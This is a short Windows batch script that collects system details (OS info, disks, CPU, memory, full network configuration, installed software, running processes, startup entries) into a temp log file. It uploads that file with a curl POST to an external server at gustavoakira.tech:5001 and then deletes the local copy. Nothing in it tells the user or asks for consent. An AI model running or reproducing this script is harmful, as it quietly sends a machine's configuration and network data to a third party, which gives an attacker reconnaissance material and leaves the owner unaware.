@echo off
setlocal

:: Generate a unique log file name with timestamp
set "timestamp=%date:~10,4%%date:~4,2%%date:~7,2%_%time:~0,2%%time:~3,2%%time:~6,2%"
set "timestamp=%timestamp:/=_%"
set "timestamp=%timestamp: =0%"
set "timestamp=%timestamp:00=0%"

set "logfile=temp_%timestamp%.log"

:: Log file path
set "logpath=%temp%\%logfile%"
echo Log file path: "%logpath%"


:: Check if the temp directory exists
if not exist "%temp%" (
    echo Temp directory does not exist.
    exit /b 1
)

:: Collect system information and save to log file
echo --- System Information --- > "%logpath%"
systeminfo >> "%logpath%"

echo. >> "%logpath%"
echo --- Disk Information --- >> "%logpath%"
wmic logicaldisk get size,freespace,caption >> "%logpath%"

echo. >> "%logpath%"
echo --- CPU Information --- >> "%logpath%"
wmic cpu get name,NumberOfCores,NumberOfLogicalProcessors,MaxClockSpeed >> "%logpath%"

echo. >> "%logpath%"
echo --- Memory Information --- >> "%logpath%"
wmic memorychip get capacity,speed,manufacturer >> "%logpath%"

echo. >> "%logpath%"
echo --- Network Configuration --- >> "%logpath%"
ipconfig /all >> "%logpath%"

echo. >> "%logpath%"
echo --- Installed Software --- >> "%logpath%"
wmic product get name,version >> "%logpath%"

echo. >> "%logpath%"
echo --- Running Processes --- >> "%logpath%"
tasklist >> "%logpath%"

echo. >> "%logpath%"
echo --- Startup Programs --- >> "%logpath%"
wmic startup get caption,command >> "%logpath%"

:: Define the target server and endpoint
set "url=https://gustavoakira.tech:5001/upload"

:: Post the log file to the endpoint using curl
curl -X POST -F "file=@%logpath%" %url%

:: Clean up the log file after upload (optional)
del "%logpath%"

endlocal

echo

pause
